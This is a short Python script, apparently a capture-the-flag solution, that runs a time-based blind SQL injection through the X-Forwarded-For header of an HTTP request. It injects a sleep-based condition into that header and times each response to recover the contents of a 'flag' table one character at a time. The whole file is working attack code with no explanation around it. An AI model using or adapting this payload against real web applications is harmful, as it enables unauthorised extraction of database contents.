import time
import requests

flag = ""
count = 1

while chr(125) not in flag:
    for a in range(48,126):
        start = time.time()
        req = requests.get(url="http://ip", headers={'X-Forwarded-For':f"1' AND (SELECT sleep(2) FROM flag where (ASCII(SUBSTR(flag,{count},1))) = '{a}'); --+"})
        end = time.time()
        
        if end-start>=2:
            flag+=chr(a)
            count+=1
            print("Flag: " + flag)
            break
print(flag)       
